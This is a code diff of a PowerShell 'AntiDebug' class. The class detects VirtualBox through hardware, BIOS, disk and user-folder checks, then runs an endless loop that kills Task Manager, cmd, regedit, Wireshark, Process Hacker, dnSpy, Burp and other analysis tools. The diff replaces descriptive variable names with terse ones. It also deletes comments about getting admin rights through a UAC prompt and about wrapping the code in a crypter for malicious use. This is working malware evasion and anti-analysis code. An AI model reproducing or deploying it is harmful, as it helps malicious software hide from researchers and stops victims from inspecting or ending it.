@@ -1,45 +1,43 @@
 class AntiDebug {
-    [string]$systemModel
-    [string]$biosVersion
-    [string]$gpuInfo
-    [bool]$isVirtual
-    [bool]$isVirtualBios
-    [bool]$isVirtualGPU
-    [bool]$isVirtualDisk
+    [string]$sys
+    [string]$bio
+    [string]$gpu
+    [bool]$V
+    [bool]$VB
+    [bool]$VG
+    [bool]$VD
     [object]$pcc
-    [string]$diskModel
-    [string]$UF
+    [string]$disk
 
     AntiDebug() {
-        $this.systemModel = (Get-WmiObject Win32_ComputerSystem).Model
-        $this.biosVersion = (Get-WmiObject Win32_BIOS).Version
-        $this.gpuInfo = (wmic path win32_videocontroller get caption).Trim()
+        $this.sys = (Get-WmiObject Win32_ComputerSystem).Model
+        $this.bio = (Get-WmiObject Win32_BIOS).Version
+        $this.gpu = (wmic path win32_videocontroller get caption).Trim()
         $this.pcc = Get-WmiObject Win32_PortConnector
-        $this.diskModel = (wmic diskdrive get model).Trim()
-        $this.UF = "C:\Users\vboxuser"
+        $this.disk = (wmic diskdrive get model).Trim()
 
-        $this.isVirtual = $this.systemModel -like '*Virtual*' -or $this.systemModel -like '*VirtualBox*'
-        $this.isVirtualBios = $this.biosVersion -like '*VBOX*'
-        $this.isVirtualGPU = $this.gpuInfo -match "Not Found" -or $this.gpuInfo -match "ERROR"
-        $this.isVirtualDisk = $this.diskModel -like '*VBOX HARDDISK*' -or $this.diskModel -like '*VBOX*'
+        $this.V = $this.sys -like '*Virtual*' -or $this.sys -like '*VirtualBox*'
+        $this.VB = $this.bio -like '*VBOX*'
+        $this.VG = $this.gpu -match "Not Found" -or $this.gpu -match "ERROR"
+        $this.VD = $this.disk -like '*VBOX HARDDISK*' -or $this.disk -like '*VBOX*'
     }
 
     [void]Check() {
-        if ($this.isVirtual) {
+        if ($this.V) {
             Write-Host "[-] This system appears to be a virtual machine." -ForegroundColor Yellow
         }
         else {
             Write-Host "[+] Passed System Model Check" -ForegroundColor Green
         }
 
-        if ($this.isVirtualBios) {
+        if ($this.VB) {
             Write-Host "[-] The BIOS version indicates this may be a VirtualBox virtual machine. Please check your environment." -ForegroundColor Yellow
         }
         else {
             Write-Host "[+] Passed BIOS Version Check" -ForegroundColor Green
         }
 
-        if ($this.isVirtualGPU) {
+        if ($this.VG) {
             Write-Host "[-] GPU information not available or an error occurred." -ForegroundColor Red
         }
         else {
@@ -57,14 +55,14 @@ class AntiDebug {
             Write-Host "[+] Found vboxpostinstall.log in C:\" -ForegroundColor Yellow
         }
 
-        if (Test-Path $this.UF) {
-            Write-Host "[-] Found vboxuser folder in $($this.UF)" -ForegroundColor Yellow
+        if (Test-Path "C:\Users\vboxuser") {
+            Write-Host "[-] Found vboxuser folder in C:\Users\vboxuser" -ForegroundColor Yellow
         }
         else {
             Write-Host "[+] Passed User Test" -ForegroundColor Green
         }
 
-        if ($this.isVirtualDisk) {
+        if ($this.VD) {
             Write-Host "[-] The disk drive model indicates this may be a VirtualBox virtual machine." -ForegroundColor Yellow
         }
         else {
@@ -77,9 +75,7 @@ class AntiDebug {
 
     [void] antidebugproccess() {
         $2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')
-        # Loop btw 
-        # i would like to mention trying kill taskmanger wont work until UAC Permissions (ADMIN), you can make uac prompt, and if person choses no then make it dont run
-        # dont use for malicious purpoeses. if you do use crypter like from Chainski on github (AES ENCODER).
+        
         while ($true) {
             foreach ($prg in $2kill) {
                 $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
